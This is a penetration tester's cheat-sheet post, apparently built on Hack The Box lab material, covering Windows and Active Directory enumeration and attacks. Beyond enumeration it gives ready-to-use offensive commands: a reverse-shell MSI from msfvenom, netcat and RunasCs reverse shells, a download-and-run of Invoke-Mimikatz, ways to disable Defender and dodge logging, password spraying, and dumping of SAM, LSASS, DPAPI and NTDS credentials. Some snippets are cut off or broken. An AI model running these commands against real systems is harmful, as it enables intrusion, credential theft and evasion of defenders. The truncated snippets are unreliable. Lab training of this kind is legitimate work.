---
title: "Windows Penetration Testing Enumeration"
date: 2024-12-17 13:01:08 +/-0800
categories: [Windows]
tags: []
image: /assets/img/Post/Multimaster.jpg
---


# Passive Enumeration

```bash
#Use Wireshark to captire either ARP or MDNS traffic (GUI)
Intrusionz3r0X@htb[/htb]$ sudo -E wireshark

#Use tcpdump to capture trafic
Intrusionz3r0X@htb[/htb]$ sudo tcpdump -i ens224 -w capture.pcap

#Read the capture.pcap and filter by IP
Intrusionz3r0X@htb[/htb]$ tshark -r capture.pcap -Y "arp" | grep -oP "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort -u

#Analyze traffic by using responder (no poisoning)
Intrusionz3r0X@htb[/htb]$ sudo responder -I ens224 -A 
```

# Active Enumeration

```bash
#Host Discovery
Intrusionz3r0X@htb[/htb]$ fping -asgq <range>
Intrusionz3r0X@htb[/htb]$ nmap -sn -n <range>

#Host Discovery
C:\>  for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
PS C:\> 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```

# Domain Enumeration

## Services

### SMB Enumeration

```bash
#Enumeration using enum4linux-ng
Intrusionz3r0X@htb[/htb]$ enum4linux-ng 10.10.11.45 -A -C

#SMBMAP
Intrusionz3r0X@htb[/htb]$ smbmap -H 10.129.14.128
Intrusionz3r0X@htb[/htb]$ smbmap -r -H x.x.x.x -u "null"
Intrusionz3r0X@htb[/htb]$ smbmap -H 10.129.14.128 -r <resource>
Intrusionz3r0X@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
Intrusionz3r0X@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
Intrusionz3r0X@htb[/htb]$ smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash

#SMBClient
Intrusionz3r0X@htb[/htb]$ smbclient -N -L //10.129.14.128
intrusionz3r0@htb:~$ smbclient -L x.x.x.x -U "null" -N
Intrusionz3r0X@htb[/htb]$ smbclient //10.129.14.128/notes

**Auth by kerberos**
#Export KRB5CCNAME=<user>.ccache
Intrusionz3r0X@htb[/htb]$ impacket-smbclient <domain>/<username>:<password> -k

#Download recursive mode
smb: \Path\to\folder\> prompt off
smb: \Path\to\folder\> recurse true
smb: \Path\to\folder\> mget <folder>
```

**Mount shared folder on Windows**

```bash
#Mount shared folder
C:\htb> net use n: \\192.168.220.129\Finance #/user:plaintext Password123
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

#Mount SMB with creds
PS C:\htb> $username = 'intrusionz3r0'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cre
```

**Mount  shared folder on Linux**

```bash
#sudo apt install cifs-utils.
Intrusionz3r0X@htb[/htb]$ sudo mkdir /mnt/Finance
Intrusionz3r0X@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
#intrusionz3r0@kali:~$ mount -t cifs //x.x.x.x/RECURSO /mnt/HTB/FOLDER -o username=USER,password=PASS,rw
Intrusionz3r0X@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
**CredentialFile:**
username=plaintext
password=Password123
domain=.
```

**Manual SMB Enumeration**

```bash
#List shared Folder
C:\htb> dir \\192.168.220.129\Finance\
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\

#Search for a specific word in the filename.
C:\htb>dir n:\*cred* /s /b
C:\htb>dir n:\*secret* /s /b
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Intrusionz3r0X@htb[/htb]$ find /mnt/Finance/ -name *cred*

#Search for a specific word within the content of the files.
c:\htb> findstr /s /i cred n:\*.*
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
Intrusionz3r0X@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

```

### Kerberos

<aside>
💡

Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.

</aside>

```powershell
# Download Kerbrute
Intrusionz3r0X@htb[/htb]$ git clone https://github.com/ropnop/kerbrute
Intrusionz3r0X@htb[/htb]$ go build -ldflags "-s -w" .
Intrusionz3r0X@htb[/htb]$ upx kerbrute

#Enumeration users
Intrusionz3r0X@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_user

# Brute force against specific user. (Common patterns: Reuse password and repeat user as password)
kerbrute bruteuser --dc <ip> -d <domain> <dictionary> <user>
```

- https://github.com/insidetrust/statistically-likely-usernames
- https://github.com/attackdebris/kerberos_enum_userlists

### LDAP

```powershell
Intrusionz3r0X@htb[/htb]$ ldapsearch -H ldap://10.10.10.182 -x -s base namingContexts
Intrusionz3r0X@htb[/htb]$ ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local"

#Enumerate Password Policy
Intrusionz3r0X@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
#title
Intrusionz3r0X@htb[/htb]$ ldapsearch -x -h 172.16.7.3 -s base namingcontexts
#title
Intrusionz3r0X@htb[/htb]$ ldapsearch -h 172.16.7.3 -x -s base -b '' "(objectClass=*)" "*" +    
#title
Intrusionz3r0X@htb[/htb]$ ldapsearch -h 172.16.7.3 -x -b "DC=INLANEFREIGHT,DC=LOCAL" '(objectClass=Person)'

#Find Users
ldapsearch -H ldap://10.10.11.236 -x -b "DC=manager,DC=htb" "(objectClass=user)"
#Find Groups
ldapsearch -H ldap://10.10.11.236 -x -b "DC=manager,DC=htb" "(objectClass=group)"
#Enumerate the entire directory Tree
ldapsearch -H ldap://10.10.11.236 -x -b "DC=manager,DC=htb" "(objectClass=*)"
#Check for details about services, sites, and directory configurations
ldapsearch -H ldap://10.10.11.236 -x -b "CN=Configuration,DC=manager,DC=htb" "(objectClass=*)"
#Retrieve object definitions to understand the directory's schema
ldapsearch -H ldap://10.10.11.236 -x -b "CN=Schema,CN=Configuration,DC=manager,DC=htb" "(objectClass=*)"
#Retrive DNS Information
ldapsearch -H ldap://10.10.11.236 -x -b "DC=DomainDnsZones,DC=manager,DC=htb" "(objectClass=*)"
ldapsearch -H ldap://10.10.11.236 -x -b "DC=ForestDnsZones,DC=manager,DC=htb" "(objectClass=*)"

#Blind Authentication
ldapsearch -H ldap://10.10.11.236 -D "CN=someuser,CN=Users,DC=manager,DC=htb" -w 'password' -b "DC=manager,DC=htb" "(objectClass=*)"

```

In case of **exceptions must derive from BaseException** use then next topic to solve it: https://github.com/fortra/impacket/issues/1206

### RID cycling attack

```bash

nxc smb 10.10.11.236  -u 'dfsdfs' -p '' --rid-brute

impacket-lookupsid dsdfsdfs@manager.htb -no-pass
```

### RPCClient

```bash
Intrusionz3r0X@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
Intrusionz3r0X@htb[/htb]$ samrdump.py 10.129.14.128
```

| **Query** | **Description** |
| --- | --- |
| `srvinfo` | Server information. |
| `enumdomains` | Enumerate all domains that are deployed in the network. |
| `querydominfo` | Provides domain, server, and user information of deployed domains. |
| `netshareenumall` | Enumerates all available shares. |
| `netsharegetinfo <share>` | Provides information about a specific share. |
| `enumdomusers` | Enumerates all domain users. |
| `queryuser <RID>` | Provides information about a specific user. |
| `querygroup <RID>` | Provides information about a specific group. |

## Get Installed Programs via PowerShell & Registry Keys

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

## **Downgrade Powershell**

<aside>
💡

W can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage.

</aside>

```bash

PS C:\htb> Get-host
PS C:\htb> powershell.exe -version 2
```

## Am I Alone?

```bash
PS C:\htb> qwinsta
```

## **Always Install Elevated**

```powershell
#Enumerating Always Install Elevated Settings
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
#Generating MSI Package
Intrusionz3r0@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
#Executng MSI
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

## Password Spraying

<aside>
⚠️

**Crackmapexec**: Pay attention to **Bad-Pwd-Count** value since this indicates the number of times the user tried to log on to the account using an incorrect password. Remember that we should run one, max two, password spraying attempts and wait over an hour between attempts.

</aside>

```powershell
#Interal Password Spraying (Linux)
Intrusionz3r0X@htb[/htb]$ for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
Intrusionz3r0X@htb[/htb]$ crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 --continue-on-success
Intrusionz3r0X@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

#Local admin Password Spraying
#Make sure **-local-auth** flag is set so we don't potentially lock out the built-in administrator for the domain
Intrusionz3r0X@htb[/htb]$ sudo crackmapexec smb **--local-auth** 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf --continue-on-success

#Internal Password Spraying - from Windows
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
PS C:\htb> Invoke-DomainPasswordSpray -UserList <users> -Domain <domain-name> -PasswordList <password> -OutFile sprayed-creds.txt
```

https://github.com/dafthack/DomainPasswordSpray

## Enumerate password policy

```powershell
#Enumerate Password policy
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
Intrusionz3r0X@htb[/htb]$ enum4linux -P 172.16.5.5
Intrusionz3r0X@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight #Best Option
Intrusionz3r0X@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

#CMD
C:\htb> net accounts
#Powerview
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

## Security Controls

```powershell
#Checked if Defender was running
PS C:\htb> netsh advfirewall show allprofiles
C:\htb> sc query windefend

#Checking the Status of Windows Defender (RealTimeProtectionEnabled=True/False)
PS C:\htb> Get-MpComputerStatus

# Disable real time monitoring in Windows Defender
PS C:\>  Set-MpPreference -DisableRealtimeMonitoring $true

#Checked if Defender was running
PS C:\htb> netsh advfirewall show allprofiles
C:\htb> sc query windefend

#Enumerate Applocker policies
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#Enumerating, enable and bypass Language Mode. 
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
PS C:\htb>  Set-ExecutionPolicy unrestricted
PS C:\htb> powershell.exe -noprofile -executionpolicy bypass -file .\script.ps1

#Enumerating and read LAPS passwords
PS C:\htb> Find-LAPSDelegatedGroups
PS C:\htb> Find-AdmPwdExtendedRights
PS C:\htb> Get-LAPSComputers

#Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
netsh advfirewall show state

#check the status and configuration settings Windows Defender
PS C:\htb> Get-MpComputerStatus

```

https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php

## Enumerate Remote Privilege Access

```powershell
#Check Remote Desktop acesss
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

#Check PSRemote access (winrm)
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
Bloodhound query: `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`
#How to Access via PSRemote (Windows)
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
#Connect via Winrm (Linux)
Intrusionz3r0X@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

#SQL Server Admin remote access
Bloodhound Query: `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`

```

## Authentication

```powershell
#PSExec
impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125
#Windows Management Instrumentation (more stealthy approach)
impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5

#Impersonate user
$user = '<domain>\<user>'
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user,$password)
Invoke-Command -ComputerName '<computer-name>' -Credential $Cred -ScriptBlock { C:\Temp\netcat.exe -e cmd <ip> <port>}

```

RunasCS

```powershell
C:\ProgramData>powershell -c wget 10.10.14.6/RunasCs.exe -outfile RunasCs.exe
C:\ProgramData>.\RunasCs.exe <username> <password> -r 10.10.14.6:443 cmd

Intrusionz3r@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 444
Connection received on 10.10.11.187 49906
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

```

https://github.com/antonioCoco/RunasCs

### Network Information

| **Networking Commands** | **Description** |
| --- | --- |
| `arp -a` | Lists all known hosts stored in the arp table. |
| `ipconfig /all` | Prints out adapter settings for the host. We can figure out the network segment from here. |
| `route print` | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

### Windows Managment Instrumentation WMI

https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

| **Command** | **Description** |
| --- | --- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list` | A listing of all processes on host |
| `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Information about all local groups |
| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts. |

### **Net Commands**

<aside>
💡

### **Net Commands Trick**

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

</aside>

| **Command** | **Description** |
| --- | --- |
| `net accounts` | Information about password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` | Information about domain groups |
| `net group "Domain Admins" /domain` | List users with domain admin privileges |
| `net group "domain computers" /domain` | List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List PC accounts of domains controllers |
| `net group <domain_group_name> /domain` | User that belongs to the group |
| `net groups /domain` | List of domain groups |
| `net localgroup` | All available groups |
| `net localgroup administrators /domain` | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators` | Information about a group (admins) |
| `net localgroup administrators [username] /add` | Add user to administrators |
| `net share` | Check current shares |
| `net user <ACCOUNT_NAME> /domain` | Get information about a user within the domain |
| `net user /domain` | List all users of the domain |
| `net user %username%` | Information about the current user |
| `net use x: \computer\share` | Mount the share locally |
| `net view` | Get a list of computers |
| `net view /all /domain[:domainname]` | Shares on the domains |
| `net view \computer /ALL` | List shares of a computer |
| `net view /domain` | List of PCs of the domain |

## Powershell CMDLED

```bash
#Discover Modules
PS C:\htb> Get-Module

#Load AD module
PS C:\htb> Import-Module ActiveDirectory

#Get Domain Info
PS C:\htb> Get-ADDomain

#Checking for trust relationships
PS C:\htb> Get-ADTrust -Filter *

#Get-ADUser listing of accounts that may be susceptible to a Kerberoasting attack
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

#Group enumeration,detailed information
PS C:\htb> Get-ADGroup -Filter * | select name
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
#List the group members
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

#Testing for Local Admin Access with the current user
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Impersonate User

```powershell
#Impersonate user
$user = '<domain>\<user>'
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user,$password)
Invoke-Command -ComputerName '<computer-name>' -Credential $Cred -ScriptBlock { C:\Temp\netcat.exe -e cmd <ip> <port>}
```

Enumerate domain trust relationships

```powershell

PS C:\htb> Import-Module activedirectory

#Enumerate domain trust relationships (built-in powershell cmdlet)
PS C:\htb> Get-ADTrust -Filter *

#Powerview Enumerate domain trust relationships
PS C:\htb> Get-DomainTrust 

# perform a domain trust mapping
PS C:\htb> Get-DomainTrustMapping

#Checking Users in the Child Domain using Get-DomainUser
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

#numerate groups with users that do not belong to the domain, also known as foreign group membership
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

#Query trust relationships
C:\htb> netdom query /domain:inlanefreight.local trust
# query domain controlores
C:\htb> netdom query /domain:inlanefreight.local dc
# query workstations and servers
C:\htb> netdom query /domain:inlanefreight.local workstation
```

**Harnessing PowerShell** 

| **Cmd-Let** | **Description** |
| --- | --- |
| `Get-Module` | Lists available modules loaded for use. |
| `Get-ExecutionPolicy -List` | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host. |
| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| `Get-ChildItem Env: | ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

# Micelaneous

```python
#Convert a UTF-16LE to UTF-8 compatible with Linux 
iconv -f UTF-16LE -t UTF-8 Applockerpolicy.txt -o Applockerpolicy2.txt
```

# Tools

## Mimikatz

```bash
PS C:\> ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
PS C:\> powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## Bloodhound

<aside>
⚠️

Check them out 

1. **first degree object control** 
2. **Group delegated object** **control** items.
</aside>

```powershell
#Executing bloodhound On Linux
Intrusionz3r0X@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
Intrusionz3r0X@htb[/htb]$ zip -r ilfreight_bh.zip *.json
Intrusionz3r0X@htb[/htb]$ sudo neo4j start
Intrusionz3r0X@htb[/htb]$ bloodhound

#Execute bloodhound against a specific domain
Intrusionz3r0X@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

sudo neo4j console

#Executin bloodhound On Windows
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
Type bloodhound into a CMD or PowerShell console
```

**Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf**

```powershell
Intrusionz3r0X@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

## Powerview

### **Users**

```powershell
#Get info about a user
PS C:\htb> Get-NetUser -UserName student107 
#List All Users
PS Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount 
#All disabled users
Get-NetUser -UACFilter ACCOUNTDISABLE 
#Domain admins kerberostable
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} 
```

### Groups

```powershell
PS C:\htb> Get-NetGroup #Get groups
PS C:\htb> Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
PS C:\htb> Get-NetGroup 'Domain Admins' #Get all data of a group
PS C:\htb> Get-NetGroup -UserName "myusername" #Get groups of a user

Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)

# Recursive Group Membership to know who to target for potential elevation of privileges.
PS C:\htb> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

## Computers

```powershell
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
Get-NetComputer #Get all computer objects
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
```

### Logon and Session

```powershell
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```

### Retrived Domain SID

```powershell
(Get-ADDomain
```

### Powerfull Powerview Commands

```powershell
# Recursive Group Membership to know who to target for potential elevation of privileges.
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

#ASREPRoastable users
PS C:\htb>  Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

#Kerberoastable users
PS C:\htb> Get-NetUser -SPN | select samaccountname,userprincipalname,useraccountcontrol | fl
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
# Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Persistence
#Asreproast
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $true
#Kerberosting
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose 
Get-ADUser -Filter 'Name -like "Jorden"' | Set-ADAccountControl -doesnotrequirepreauth $false

#Finding Passwords in the Description Field using Get-Domain User
Get-DomainUser * | Select-Object samaccountname, userprincipalname, useraccountcongtrol, description | Where-Object {$_.Description -ne $null} | fl
 
#All disabled users
Get-NetUser -UACFilter ACCOUNTDISABLE 

#Retrieve *most* users who can perform DC replication for inlanefreight.local (i.e. DCsync)
Get-ObjectAcl "dc=dc=inlanefreight,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll'
```

## Netexec

[Welcome | NetExec](https://www.netexec.wiki/)

When you start your internal pentest, these are the first modules you should try:

```bash
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M zerologon
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u 'user' -p 'pass' -M nopac
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M printnightmare
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M smbghost
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M ms17-010
```

**Scan for Coerce Vulnerabilities**

- PetitPotam
- DFSCoerce
- PrinterBug
- MSEven
- ShadowCoerce

```bash
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M coerce_plus
```

If a vulnerability is found, you can set a LISTENER ip to coerce the connection.

```bash
#By default the LISTENER ip will be set to localhost, so no traffic will appear on the network.
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
```

To run all exploit methods at once, add the ALWAYS=true option, otherwise it will stop if the underlying RPC connection reports a successful coercion.

```
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
```

You can also check for a specific coerce method by specifying it:

```
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

```bash
#Enumerate host
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24

#Enumerate null session (Try guest logon by using random username but password empty)
Intrusionz3r0X@htb[/htb]$ nxc smb 10.10.10.161 -u '' -p ''
Intrusionz3r0X@htb[/htb]$ nxc smb 10.10.10.161 -u '' -p '' --shares
Intrusionz3r0X@htb[/htb]$ nxc smb 10.10.10.161 -u '' -p '' --pass-pol
Intrusionz3r0X@htb[/htb]$ nxc smb 10.10.10.161 -u '' -p '' --users
Intrusionz3r0X@htb[/htb]$ nxc smb 10.10.10.161 -u '' -p '' --groups

#Active sessions
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions

#Shares and access
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE

# Enumerate users
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
Intrusionz3r0X@htb[/htb]$  nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
# Enumerate Groups
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-group
# Enumerate the logged on users
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
#Enumerate the shared folders
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Enumerate disk
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks

#Enuemrate Anti-viruts & EDR
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u user -p pass -M enum_av

#Send a file to the remote target
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
Intrusionz3r0X@htb[/htb]$ nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```

Obtaint Credentials

```bash
#DUMP SAM (Admin or local admin privilege)
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam

#Dump LSA (Admin or local admin privilege)
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --lsa

#Dump LSASS (Admin or local admin privilege)
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump

#DPAPI credentials get all secrets from Credential Manager, Chrome, Edge, Firefox.
$ nxc smb <ip> -u user -p password --dpapi
$ nxc smb <ip> -u user -p password --dpapi cookies
$ nxc smb <ip> -u user -p password --dpapi nosystem
$ nxc smb <ip> -u user -p password --local-auth --dpapi nosystem

# Dump the NTDS.dit from target DC (Admin or local admin privilege)
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
